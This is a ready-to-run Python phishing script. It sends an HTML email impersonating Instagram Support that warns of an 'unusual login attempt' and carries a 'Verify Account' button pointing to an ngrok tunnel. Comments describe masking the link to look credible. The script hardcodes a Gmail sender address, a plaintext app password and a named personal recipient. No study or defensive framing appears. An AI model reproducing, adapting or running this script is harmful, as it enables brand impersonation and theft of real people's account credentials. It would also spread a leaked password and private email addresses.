import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# 1. Configuration
smtp_server = "smtp.gmail.com"
smtp_port = 587
sender_email = "alrentru@gmail.com"  
sender_password = "sipivolbuzjsfjno" # Your app-specific password
receiver_email = " nurkyz.sydykbekova1@gmail.com" # The email you want to send it to

# 2. Credible Link Logic
# Masking the file path behind a button or "Instagram" text
technical_link = " https://uninterruptive-gael-pennate.ngrok-free.dev"

# 3. HTML Content (Modern Instagram Design)
subject = "Security Alert: Unusual Login Attempt"

body = f"""
<!DOCTYPE html>
<html>
<head>
    <style>
        body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; padding: 20px; }}
        .email-container {{ max-width: 450px; margin: 0 auto; background: #ffffff; border: 1px solid #dbdbdb; border-radius: 5px; padding: 30px; text-align: center; }}
        .ig-logo {{ width: 50px; margin-bottom: 20px; }}
        .header {{ font-size: 18px; font-weight: 600; color: #262626; margin-bottom: 15px; }}
        .message {{ font-size: 14px; color: #262626; line-height: 1.5; margin-bottom: 25px; }}
        .verify-btn {{ display: inline-block; background-color: #0095f6; color: #ffffff; text-decoration: none; padding: 12px 25px; border-radius: 8px; font-weight: 600; font-size: 14px; }}
        .footer {{ font-size: 12px; color: #8e8e8e; margin-top: 30px; }}
    </style>
</head>
<body>
    <div class="email-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="ig-logo">
        <div class="header">Verify your account</div>
        <div class="message">
            We noticed an unusual login attempt from a device in <b>Bishkek, Kyrgyzstan</b>. 
            If this was not you, please verify your identity to secure your account.
        </div>
        
        <a href="{technical_link}" class="verify-btn">Verify Account</a>
        
        <div class="footer">
            If you didn't request this, you can safely ignore this message.<br><br>
            © Instagram from Meta, 1601 Willow Road, Menlo Park, CA 94025
        </div>
    </div>
</body>
</html>
"""

# 4. Assembling and Sending
message = MIMEMultipart()
message["From"] = f"Instagram Support <{sender_email}>"
message["To"] = receiver_email
message["Subject"] = subject
message.attach(MIMEText(body, "html"))

try:
    print("Connecting to Gmail...")
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(sender_email, sender_password)
    
    print(f"Sending email to {receiver_email}...")
    server.sendmail(sender_email, receiver_email, message.as_string())
    
    print("Success: Email sent successfully!")
    server.quit()
except Exception as e:
    print(f"Error: {e}")
